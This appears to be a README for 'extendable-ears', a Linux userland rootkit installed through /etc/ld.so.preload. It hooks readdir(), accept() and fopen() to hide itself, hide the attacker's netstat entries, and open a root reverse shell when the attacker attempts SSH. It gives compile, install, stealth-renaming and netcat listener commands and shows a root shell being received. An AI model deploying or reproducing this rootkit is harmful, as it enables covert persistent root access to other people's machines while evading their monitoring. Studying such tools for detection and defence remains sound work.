# extendable-ears
A Linux userland rootkit that hooks function calls via a malicious shared library in `/etc/ld.so.preload`.
Upon failed SSH authentication to the target, the target will send a reverse shell back to the attacker.

### How it works
- Function calls are hooked by placing a shared library (this rootkit) into `/etc/ld.so.preload`
- To hide the rootkit's presence, `readdir()` and `readdir64()` are hooked to prevent `ld.so.preload` from being listed in directory outputs (like ls)
    - Although, listing `/etc/ld.so.preload` directly will show the file :/ (will have to add more hooks to prevent this I think)
- To send a shell the attacker, `accept()` is hooked and extendable-ears reads the client address from the `accept()` function.
    - If the client address is the attacker's IP (set in the config file), extendable-ears will send a reverse shell back to the attacker
- To hide connections from netstat, `fopen()` is hooked to check whether `/proc/net/tcp` (which stores TCP connection info) is being read.
    - If it is, extendable-ears reads /proc/net/tcp into a temporary file itself and excludes any mentions of the attacker IP
    - It then writes out the temporary file to the user instead of /proc/net/tcp

### Limitations
- Must be installed as root
    - (otherise the accept() hook won't work)

## Configure & Compile
In `extendable-ears.c` modify:
- ATTACKER_IP - change this to your own attacking IP
- ATTACKER_IP_HEX_NBO 
    - This is the hex value of your attacking IP in network-byte-order, used for hiding your netstat connection on the target. Example below:
        - rour attacking IP = 84.127.24.22
        - reverse it to get the network-byte-order = 22.24.127.84
        - convert each of the 4 numbers to hex = 16.18.7f.54
        - insert this value into ATTACKER_IP_HEX_NBO without dot-decimal notation = 16187f54
- ATTACKER_PORT - the port you want the reverse shell to connect on

Compile:
```bash
root@attacker:~# gcc extendable-ears.c -o extendable-ears.so -fPIC -shared -ldl -D_GNU_SOURCE
```

## Installation
On the target, copy the shared library/rootkit to where the other shared libraries reside.

64-bit example:
```bash
root@victim:~# cp extendable-ears.so /lib/x86_64-linux-gnu/
```
And copy the path of the rootkit into /etc/ld.so.preload.
```bash
root@victim:~# echo "/lib/x86_64-linux-gnu/extendable-ears.so" > /etc/ld.so.preload
```

I would advise renaming `extendable-ears.so` to something more stealthy.

### Verify installation
You can check if the rootkit is installed by running```ldd``` and checking that your malicious library gets loaded.
```bash
root@victim:~# ldd /usr/sbin/sshd
	linux-vdso.so.1 (0x00007ffe9214c000)
	/lib/x86_64-linux-gnu/extendable-ears.so (0x00007f17ed354000)
    [...]
```
Also check /etc/ld.so.preload for your entry.
```bash
root@victim:~# cat /etc/ld.so.preload 
/lib/x86_64-linux-gnu/extendable-ears.so
```

## Usage
1. Install as above
2. Start a listener to receive reverse shell
```bash
root@attacker:~# nc -lvnp 9001
```
3. SSH to the target machine. A shell should spawn on your listener.
It (almost) always doens't work the first time, so SSH twice.
```bash
root@attacker:~# ssh hey@10.11.0.56
hey@10.11.0.56's password:
^C
root@attacker:~# ssh hey@10.11.0.56
hey@10.11.0.56's password:
^C
```
```bash
root@attacker:~# nc -lvnp 9001
[...]
Connection received
[+] spawning shell... 
id
uid=0(root) gid=0(root) groups=0(root)
```

## Remove rootkit
Delete `/etc/ld.so.preload` and delete the maliciuos library. 
Nothing else needed.
```bash
root@victim:~# rm /etc/ld.so.preload
root@victim:~# rm /lib/x86_64-linux-gnu/extendable-ears.so
```

## Improvements
- Hide /etc/ld.so.preload better
- SSL encrypted reverse shell

## Issues
- accept() hook won't spawn reverse shell first time round, always takes at least 2 tries.
- When rootkit is loaded, commands that don't exist won't produce an error (probably something to do with dup2 or readdir)
    ```bash
    root@victim:~# asdfs
    root@victim:~# 
    ```